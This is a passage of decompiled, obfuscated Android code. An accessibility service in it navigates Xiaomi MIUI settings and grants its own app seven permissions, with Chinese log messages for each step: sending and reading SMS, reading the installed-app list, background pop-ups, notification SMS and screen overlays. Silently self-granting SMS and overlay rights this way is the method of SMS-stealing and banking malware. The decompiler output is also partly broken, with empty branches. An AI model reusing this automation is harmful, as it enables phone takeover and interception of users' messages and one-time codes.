                                                                                                                                            ((AccessibilityNodeInfo) it20.next()).recycle();
                                                                                                                                        }
                                                                                                                                    }
                                                                                                                                    it7 = it9;
                                                                                                                                }
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                    it9 = it7;
                                                                                                                    z5 = false;
                                                                                                                    z4 = true;
                                                                                                                    if (z5 != z4) {
                                                                                                                    }
                                                                                                                    if (z3) {
                                                                                                                    }
                                                                                                                }
                                                                                                                if (z3) {
                                                                                                                }
                                                                                                            } else {
                                                                                                                it9 = it7;
                                                                                                                z2 = false;
                                                                                                            }
                                                                                                        }
                                                                                                        rootInActiveWindow2.recycle();
                                                                                                    } else {
                                                                                                        it9 = it7;
                                                                                                        z2 = false;
                                                                                                    }
                                                                                                    if (z2) {
                                                                                                        c0367a417.m212274d8("│ │ │ │   📍 已返回权限列表（无允许按钮）");
                                                                                                    } else {
                                                                                                        c0367a417.m212274d8("│ │ │ │   🔙 还在详情页（检测到允许按钮），执行返回");
                                                                                                        c0367a417.f55106a0.performGlobalAction(1);
                                                                                                    }
                                                                                                    it7 = it9;
                                                                                                    linkedHashSet8 = linkedHashSet6;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17 = miuiSteps$executeBackgroundPopupFlow$15;
                                                                                                    Map map122 = map4;
                                                                                                    c0367a419 = c0367a417;
                                                                                                    LinkedHashSet linkedHashSet152 = linkedHashSet8;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54344a0 = c0367a419;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54345a1 = map122;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54346a2 = linkedHashSet152;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54347a3 = it7;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54351a7 = i64;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54352a8 = i63;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54353a9 = i62;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54354b0 = i61;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54355b1 = i60;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54363b9 = 25;
                                                                                                    if (c0367a419.m212294f9(2, 100L, 500L, miuiSteps$executeBackgroundPopupFlow$17) != coroutineSingletons4) {
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                            return coroutineSingletons2;
                                                                        }
                                                                        int i100 = i27;
                                                                        int i101 = i32;
                                                                        Iterator it21 = it2;
                                                                        c0367a411 = c0367a412;
                                                                        coroutineSingletons5 = coroutineSingletons;
                                                                        mapM213614f9 = map;
                                                                        str27 = str9;
                                                                        linkedHashSet = linkedHashSet2;
                                                                        i80 = i29;
                                                                        i67 = i30;
                                                                        i69 = i28;
                                                                        i23 = i33;
                                                                        i66 = i31;
                                                                        i78 = i100;
                                                                        i79 = i101;
                                                                        it10 = it21;
                                                                        it15 = it;
                                                                        if (!it15.hasNext()) {
                                                                            Map map13 = mapM213614f9;
                                                                            coroutineSingletons4 = coroutineSingletons5;
                                                                            str17 = str12;
                                                                            i68 = i79;
                                                                            map4 = map13;
                                                                            i26 = i80;
                                                                            i21 = i78;
                                                                            if (i34 == 0) {
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                            CoroutineSingletons coroutineSingletons10 = coroutineSingletons5;
                                                            map5 = mapM213614f9;
                                                            coroutineSingletons4 = coroutineSingletons10;
                                                            int i102 = i21;
                                                            MiuiSteps$executeBackgroundPopupFlow$1 miuiSteps$executeBackgroundPopupFlow$19 = miuiSteps$executeBackgroundPopupFlow$1;
                                                            str11 = str2;
                                                            str7 = str5;
                                                            str8 = str6;
                                                            str17 = str25;
                                                            i65 = i22;
                                                            miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$19;
                                                            i21 = i102;
                                                            int i982 = i26;
                                                            if (linkedHashSet.size() < 7) {
                                                            }
                                                            str19 = str11;
                                                            c0367a420 = c0367a411;
                                                            c0367a420.m212274d8(str19);
                                                            c0367a420.m212274d8("│ │ │ │ 📊 权限设置结果: " + linkedHashSet.size() + "/7 (7个唯一权限)");
                                                            StringBuilder sb22 = new StringBuilder("│ │ │ │   完成的权限组: ");
                                                            sb22.append(linkedHashSet);
                                                            c0367a420.m212274d8(sb22.toString());
                                                            Set setKeySet22 = map5.keySet();
                                                            arrayList = new ArrayList();
                                                            while (r0.hasNext()) {
                                                            }
                                                            if (!arrayList.isEmpty()) {
                                                            }
                                                            miuiSteps$executeBackgroundPopupFlow$15.f54344a0 = c0367a420;
                                                            miuiSteps$executeBackgroundPopupFlow$15.f54345a1 = null;
                                                            miuiSteps$executeBackgroundPopupFlow$15.f54346a2 = null;
                                                            miuiSteps$executeBackgroundPopupFlow$15.f54347a3 = null;
                                                            miuiSteps$executeBackgroundPopupFlow$15.f54348a4 = null;
                                                            miuiSteps$executeBackgroundPopupFlow$15.f54349a5 = null;
                                                            miuiSteps$executeBackgroundPopupFlow$15.f54350a6 = null;
                                                            miuiSteps$executeBackgroundPopupFlow$15.f54363b9 = 28;
                                                            if (b81.m210571b1(150L, miuiSteps$executeBackgroundPopupFlow$15) == coroutineSingletons4) {
                                                            }
                                                            c0367a420.f55109a3.m214207a9(MiuiSteps$FlowType.BACKGROUND_POPUP);
                                                            c0367a420.f55109a3.m214207a9(MiuiSteps$FlowType.OVERLAY_PERMISSION);
                                                            c0367a420.m212274d8(str19);
                                                            c0367a420.m212274d8("│ │ │ │ ✅ 权限管理设置完成");
                                                            c0367a420.m212274d8("│ │ │ └─────────────────────────────────────────");
                                                            return t60.m214689a7(true);
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                    miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list3;
                    miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = list2;
                    miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i11;
                    miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i10;
                    miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i8;
                    miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 10;
                    miuiSteps$executeBackgroundPopupFlow$13 = miuiSteps$executeBackgroundPopupFlow$1;
                    c0367a47 = c0367a42;
                    if (c0367a47.m212294f9(2, 100L, 2000L, miuiSteps$executeBackgroundPopupFlow$13) != coroutineSingletons5) {
                        i14 = i8;
                        miuiSteps$executeBackgroundPopupFlow$1 = miuiSteps$executeBackgroundPopupFlow$13;
                        i13 = i11;
                        c0367a44 = c0367a47;
                        c0367a44.m212274d8("│ │ │ │   🔍 验证权限管理页面...");
                        miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a44;
                        miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list3;
                        miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = list2;
                        miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i13;
                        miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i10;
                        miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i14;
                        miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 11;
                        objM212291f6 = c0367a44.m212291f6(list2, 2000L, miuiSteps$executeBackgroundPopupFlow$1);
                        if (objM212291f6 != coroutineSingletons5) {
                            c0367a45 = c0367a44;
                            i15 = i14;
                            obj3 = objM212291f6;
                            if (((Boolean) obj3).booleanValue()) {
                                c0367a45.m212274d8("│ │ │ │   ⚠️ 权限管理页面验证失败");
                                if (i15 < i10) {
                                    c0367a45.m212274d8("│ │ │ │   🔙 返回并重试...");
                                    c0367a45.f55106a0.performGlobalAction(1);
                                    miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a45;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list3;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = list2;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i13;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i10;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i15;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 12;
                                    if (b81.m210571b1(300L, miuiSteps$executeBackgroundPopupFlow$1) != coroutineSingletons5) {
                                        i12 = i15;
                                    }
                                } else {
                                    c0367a45.m212274d8("│ │ │ │   ⚠️ " + i10 + "次尝试后仍未验证成功，继续执行...");
                                    i12 = i15;
                                }
                                listM213306g54 = list2;
                                c0367a42 = c0367a45;
                                i9 = i10;
                                listM213306g5 = list3;
                                if (i12 == i9) {
                                }
                            } else {
                                c0367a45.m212274d8("│ │ │ │   ✅ 权限管理页面验证成功");
                                c0367a45.m212274d8(str2);
                                c0367a45.m212274d8("│ │ │ │ 🔹 [步骤3] 查找「其他权限」入口（等待2秒）");
                                jCurrentTimeMillis = System.currentTimeMillis();
                                list4 = list3;
                                c0367a46 = c0367a45;
                                i16 = 0;
                                if (System.currentTimeMillis() - jCurrentTimeMillis >= 2000) {
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons5;
            case 1:
                i = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                listM213306g5 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a4 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                c0367a4.m212274d8("│ │ │ │ 🔹 [步骤1] 打开应用详情");
                listM213306g52 = AbstractC0716jf.m213306g5("权限管理", "通知管理", "存储占用", "流量使用情况", "自启动", "电量使用详情", "Permissions", "Notifications", "Storage", "Data usage", "Auto-start", "Battery usage");
                listM213306g53 = AbstractC0716jf.m213306g5("无障碍服务", "快捷方式", "选项");
                list = listM213306g5;
                c0367a42 = c0367a4;
                i2 = 0;
                i3 = 1;
                i4 = i;
                if (i3 >= i75) {
                }
                break;
            case 2:
                i5 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i6 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i4 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                listM213306g53 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                listM213306g52 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                list = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a42 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str2 = "│ │ │ │";
                str3 = "/";
                str4 = ")";
                i2 = i6;
                i3 = i5 + 1;
                str24 = str2;
                str21 = str;
                str23 = str4;
                str22 = str3;
                i75 = 4;
                if (i3 >= i75) {
                }
                break;
            case 3:
                i5 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i6 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i4 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                listM213306g53 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                listM213306g52 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                list = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a42 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str2 = "│ │ │ │";
                str3 = "/";
                str4 = ")";
                c0367a42.m212274d8("│ │ │ │   ⏳ 等待页面加载稳定...");
                miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list;
                miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = listM213306g52;
                miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = listM213306g53;
                miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i4;
                miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i6;
                miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i5;
                miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 4;
                miuiSteps$executeBackgroundPopupFlow$12 = miuiSteps$executeBackgroundPopupFlow$1;
                c0367a43 = c0367a42;
                if (c0367a43.m212294f9(2, 100L, 2000L, miuiSteps$executeBackgroundPopupFlow$12) != coroutineSingletons5) {
                }
                return coroutineSingletons5;
            case 4:
                i5 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i6 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i4 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                listM213306g53 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                listM213306g52 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                list = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a42 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                str2 = "│ │ │ │";
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str3 = "/";
                str4 = ")";
                rootInActiveWindow = c0367a42.f55106a0.getRootInActiveWindow();
                if (rootInActiveWindow == null) {
                }
                if (!z) {
                }
                return coroutineSingletons5;
            case 5:
            case 7:
                i5 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i6 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i4 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                listM213306g53 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                listM213306g52 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                list = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a42 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str2 = "│ │ │ │";
                str3 = "/";
                str4 = ")";
                i2 = i6;
                i3 = i5 + 1;
                str24 = str2;
                str21 = str;
                str23 = str4;
                str22 = str3;
                i75 = 4;
                if (i3 >= i75) {
                }
                break;
            case 6:
                int i103 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i6 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i4 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                listM213306g53 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                listM213306g52 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                list = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a42 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                i7 = i103;
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str2 = "│ │ │ │";
                str3 = "/";
                str4 = ")";
                obj = obj7;
                if (((Boolean) obj).booleanValue()) {
                }
                break;
            case 8:
                int i104 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i10 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                int i105 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                list2 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                List list8 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                C0367a4 c0367a427 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                i11 = i105;
                c0367a42 = c0367a427;
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str5 = "/";
                str6 = ")";
                i8 = i104;
                list3 = list8;
                str2 = "│ │ │ │";
                obj2 = obj7;
                if (!((Boolean) obj2).booleanValue()) {
                }
                miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list3;
                miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = list2;
                miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i11;
                miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i10;
                miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i8;
                miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 10;
                miuiSteps$executeBackgroundPopupFlow$13 = miuiSteps$executeBackgroundPopupFlow$1;
                c0367a47 = c0367a42;
                if (c0367a47.m212294f9(2, 100L, 2000L, miuiSteps$executeBackgroundPopupFlow$13) != coroutineSingletons5) {
                }
                return coroutineSingletons5;
            case 9:
                i12 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i10 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i13 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                List list9 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                List list10 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                C0367a4 c0367a428 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                c0367a42 = c0367a428;
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str5 = "/";
                str6 = ")";
                list3 = list10;
                str2 = "│ │ │ │";
                listM213306g54 = list9;
                i9 = i10;
                listM213306g5 = list3;
                if (i12 == i9) {
                }
                break;
            case 10:
                i14 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i10 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i13 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                list2 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                List list11 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                C0367a4 c0367a429 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                c0367a44 = c0367a429;
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str5 = "/";
                str6 = ")";
                list3 = list11;
                str2 = "│ │ │ │";
                c0367a44.m212274d8("│ │ │ │   🔍 验证权限管理页面...");
                miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a44;
                miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list3;
                miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = list2;
                miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i13;
                miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i10;
                miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i14;
                miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 11;
                objM212291f6 = c0367a44.m212291f6(list2, 2000L, miuiSteps$executeBackgroundPopupFlow$1);
                if (objM212291f6 != coroutineSingletons5) {
                }
                return coroutineSingletons5;
            case oe0.DEFAULT_M /* 11 */:
                int i106 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i10 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i13 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                list2 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                List list12 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                C0367a4 c0367a430 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                list3 = list12;
                str2 = "│ │ │ │";
                c0367a45 = c0367a430;
                i15 = i106;
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str5 = "/";
                str6 = ")";
                obj3 = obj7;
                if (((Boolean) obj3).booleanValue()) {
                }
                break;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                i12 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i10 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i13 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                list2 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                List list13 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                C0367a4 c0367a431 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                list3 = list13;
                str2 = "│ │ │ │";
                c0367a45 = c0367a431;
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str5 = "/";
                str6 = ")";
                listM213306g54 = list2;
                c0367a42 = c0367a45;
                i9 = i10;
                listM213306g5 = list3;
                if (i12 == i9) {
                }
                break;
            case 13:
                j = miuiSteps$executeBackgroundPopupFlow$1.f54360b6;
                int i107 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                int i108 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                List list14 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                C0367a4 c0367a432 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                list5 = list14;
                str2 = "│ │ │ │";
                c0367a48 = c0367a432;
                i17 = i108;
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str5 = "/";
                str6 = ")";
                i16 = i107;
                obj4 = obj7;
                if (((Boolean) obj4).booleanValue()) {
                }
                return coroutineSingletons5;
            case 14:
                i18 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i19 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                List list15 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                C0367a4 c0367a433 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                list5 = list15;
                c0367a49 = c0367a433;
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str2 = "│ │ │ │";
                str5 = "/";
                str6 = ")";
                c0367a49.m212274d8("│ │ │ │   🔍 验证子页面（查找短信/电话/联系人文本）...");
                miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a49;
                miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = null;
                miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i19;
                miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i18;
                miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 15;
                objM212291f62 = c0367a49.m212291f6(list5, 2000L, miuiSteps$executeBackgroundPopupFlow$1);
                if (objM212291f62 != coroutineSingletons5) {
                }
                return coroutineSingletons5;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                int i109 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i19 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                c0367a49 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                i20 = i109;
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str2 = "│ │ │ │";
                str5 = "/";
                str6 = ")";
                obj5 = obj7;
                if (((Boolean) obj5).booleanValue()) {
                }
                i16 = i20;
                i21 = i19;
                c0367a46 = c0367a49;
                if (i16 == 0) {
                }
                miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a46;
                miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = null;
                miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = null;
                miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = null;
                miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i21;
                miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 17;
                miuiSteps$executeBackgroundPopupFlow$14 = miuiSteps$executeBackgroundPopupFlow$1;
                c0367a410 = c0367a46;
                if (c0367a410.m212294f9(2, 100L, 500L, miuiSteps$executeBackgroundPopupFlow$14) != coroutineSingletons5) {
                }
                return coroutineSingletons5;
            case 16:
                long j2 = miuiSteps$executeBackgroundPopupFlow$1.f54360b6;
                int i110 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                int i111 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                List list16 = (List) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a46 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                i16 = i110;
                jCurrentTimeMillis = j2;
                i13 = i111;
                list4 = list16;
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str2 = "│ │ │ │";
                str5 = "/";
                str6 = ")";
                if (System.currentTimeMillis() - jCurrentTimeMillis >= 2000) {
                }
                break;
            case 17:
                i21 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                c0367a411 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str2 = "│ │ │ │";
                str5 = "/";
                str6 = ")";
                mapM213614f9 = AbstractC0770a1.m213614f9(cq0.m212497e0("发送短信", AbstractC1117qo.m214451e7("发送短信")), cq0.m212497e0("读取短信", AbstractC0716jf.m213306g5("读取短信与彩信", "读取短信")), cq0.m212497e0("读取应用列表", AbstractC0716jf.m213306g5("读取应用列表", "获取应用列表")), cq0.m212497e0("后台弹出界面", AbstractC1117qo.m214451e7("后台弹出界面")), cq0.m212497e0("通知类短信", AbstractC1117qo.m214451e7("通知类短信")), cq0.m212497e0("显示悬浮窗", AbstractC0716jf.m213306g5("显示悬浮窗", "悬浮窗")));
                linkedHashSet = new LinkedHashSet();
                c0367a411.m212274d8("│ │ │ │ 📋 要查找的权限（7个唯一权限）: " + AbstractC0715je.m213303j0(mapM213614f9.keySet()));
                i22 = 0;
                i23 = 0;
                i24 = 1;
                i25 = 3;
                i26 = 3;
                if (linkedHashSet.size() >= 7) {
                }
                break;
            case 18:
                int i112 = miuiSteps$executeBackgroundPopupFlow$1.f54358b4;
                int i113 = miuiSteps$executeBackgroundPopupFlow$1.f54357b3;
                int i114 = miuiSteps$executeBackgroundPopupFlow$1.f54356b2;
                int i115 = miuiSteps$executeBackgroundPopupFlow$1.f54355b1;
                int i116 = miuiSteps$executeBackgroundPopupFlow$1.f54354b0;
                int i117 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                int i118 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                int i119 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                String str29 = miuiSteps$executeBackgroundPopupFlow$1.f54350a6;
                it = miuiSteps$executeBackgroundPopupFlow$1.f54349a5;
                String str30 = miuiSteps$executeBackgroundPopupFlow$1.f54348a4;
                Iterator it22 = (Iterator) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                ?? r0 = (Set) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                Map map14 = (Map) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                C0367a4 c0367a434 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                coroutineSingletons = coroutineSingletons5;
                str7 = "/";
                i27 = i119;
                str8 = ")";
                i28 = i114;
                i29 = i117;
                i30 = i118;
                str9 = str30;
                it2 = it22;
                miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$1;
                i31 = i113;
                i32 = i116;
                str10 = str29;
                c0367a412 = c0367a434;
                i33 = i115;
                i34 = i112;
                objM212263c2 = obj7;
                str11 = "│ │ │ │";
                linkedHashSet2 = r0;
                str12 = "│ │ │ │ ✅ 全部7个权限已完成!";
                map = map14;
                if (!((Boolean) objM212263c2).booleanValue()) {
                }
                break;
            case Base64.Encoder.LINE_GROUPS /* 19 */:
                int i120 = miuiSteps$executeBackgroundPopupFlow$1.f54358b4;
                int i121 = miuiSteps$executeBackgroundPopupFlow$1.f54357b3;
                i35 = miuiSteps$executeBackgroundPopupFlow$1.f54356b2;
                i36 = miuiSteps$executeBackgroundPopupFlow$1.f54355b1;
                i37 = miuiSteps$executeBackgroundPopupFlow$1.f54354b0;
                int i122 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i38 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i39 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                str13 = miuiSteps$executeBackgroundPopupFlow$1.f54348a4;
                Iterator it23 = (Iterator) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                ?? r02 = (Set) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                Map map15 = (Map) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a413 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                coroutineSingletons2 = coroutineSingletons5;
                i40 = i121;
                str12 = "│ │ │ │ ✅ 全部7个权限已完成!";
                str7 = "/";
                str14 = ")";
                i41 = i120;
                map = map15;
                i29 = i122;
                str11 = "│ │ │ │";
                linkedHashSet2 = r02;
                miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$1;
                it3 = it23;
                miuiSteps$executeBackgroundPopupFlow$15.f54344a0 = c0367a413;
                miuiSteps$executeBackgroundPopupFlow$15.f54345a1 = map;
                miuiSteps$executeBackgroundPopupFlow$15.f54346a2 = linkedHashSet2;
                miuiSteps$executeBackgroundPopupFlow$15.f54347a3 = it3;
                miuiSteps$executeBackgroundPopupFlow$15.f54348a4 = str13;
                miuiSteps$executeBackgroundPopupFlow$15.f54351a7 = i39;
                miuiSteps$executeBackgroundPopupFlow$15.f54352a8 = i38;
                miuiSteps$executeBackgroundPopupFlow$15.f54353a9 = i29;
                miuiSteps$executeBackgroundPopupFlow$15.f54354b0 = i37;
                miuiSteps$executeBackgroundPopupFlow$15.f54355b1 = i36;
                miuiSteps$executeBackgroundPopupFlow$15.f54356b2 = i35;
                miuiSteps$executeBackgroundPopupFlow$15.f54357b3 = i40;
                miuiSteps$executeBackgroundPopupFlow$15.f54358b4 = i41;
                C0367a4 c0367a4232 = c0367a413;
